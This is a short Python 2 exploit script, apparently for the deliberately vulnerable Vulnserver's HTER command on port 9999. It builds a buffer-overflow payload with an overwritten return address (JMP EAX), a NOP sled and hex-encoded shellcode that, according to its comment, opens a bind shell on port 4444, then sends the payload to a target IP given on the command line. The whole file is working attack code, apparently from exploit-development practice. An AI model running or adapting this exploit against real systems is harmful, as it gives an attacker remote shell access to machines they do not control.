#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    sys.exit('Usage: %s IP' % sys.argv[0])

#JMP EAX
EIP = "03125062"

# Loads of way to exploit this. Only trick to it was figuring out that every char was interpreted as hex.

#Bind 4444
Shellcode = (
"b81ae7b00bd9cbd97424f45b31c9b1"
"5331431283c3040359e952fea11d10"
"0159de758bbcefb5efb540067b9b6c"
"ed290fe683e5204f29d00f5002200e"
"d25975f0eb9188f12ccf61a3e59bd4"
"5381d6e4d8d9f76c3da9f65d90a1a0"
"7d1365d9370b6ae48ea05892106091"
"5bbe4d1daebe8a9a51b5e2d8ecce31"
"a22a5aa104b8fc0db46d9ac6badae8"
"80dedd3dbbdb56c06b6a2ce7af36f6"
"86f69259b6e87c05126390522f2efd"
"9702d0fdbf15a3cf608e2b7ce808ac"
"83c3ed227aec0d6bb9b85d0368c135"
"d39514a3db30c7d62682b756886bd2"
"58f78cddb29025203d8fe9addbc501"
"f87471e0df4ce61b0ae580545c32af"
"644a1427ef99a056f0b7800f674d41"
"6219524814bac117e4b5f98fb392cc"
"d9510f767047d2eebbc309d342cadc"
"6f61dc186f2d88f426fb66b3904dd0"
"6d4e04b4e8bc97c2f4e8612a444534"
"556901b02e97b13fe513c175a7324a"
"d0320717e3e9442e601b35d5786e30"
"913e83488aaaa3ffabfe"
)

crash = "HTER "
buffer = crash + "A"*1000 + "B"*1000 + "C"*41 + EIP + "90"*40 + Shellcode+ "D"*1000 + "E"*1000 + "F"*976

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 9999))
response = s.recv(1024)
print response

s.send(buffer)
s.close()
